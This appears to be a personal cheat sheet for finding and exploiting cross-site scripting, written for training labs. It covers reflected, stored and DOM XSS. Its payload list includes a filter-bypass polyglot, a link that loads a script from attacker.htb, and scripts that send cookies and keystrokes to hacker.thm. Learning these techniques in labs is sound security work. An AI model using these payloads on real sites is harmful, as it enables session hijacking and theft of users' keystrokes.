#### Methodology
##### XSS methodology:
```
Find where input gets reflected
Check for XSS types
Escape HTML/JS (use polyglot)
Use payloads
```

##### Reflected XSS
Look for:
```cpp
Parameters in URL query: http://vulnerable.thm/forum?popup=<script>alert('XSS');</script>
URL file path: ?
```
Exploitation:
Create malicious link: `http://vulnerable.thm/forum?popup=<script src=attacker.htb/exploit.js>`

##### Stored XSS
Look for:
```cpp
Unsanitized comment: payload in fields
Websile listings: payload in fields
```
Note: Attempt at uncommon places (age input with a dropdown for an integer etc)
Exploitation: 
Create hidden JS, send malicous link

##### DOM XSS
Look for accessible variables in the JS code
Check if variables are passed to unsafe methods such as `eval()`


##### Payloads
To bypass `alert` blocks, use `prompt` or `confirm`
```C++
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
// Polyglot, escapes a lot.

<script>alert('XSS');</script> // Proof of concept, sometimes blocked
"><script>alert('XSS');</script> // Escape HTML
</script><script>alert('XSS');</script> // Escape javascript functions

<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script> // Steal cookies such as PHPSESSID in base64, sent to hacker.thm 
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script> // Log keys, keys sent to hacker.thm

```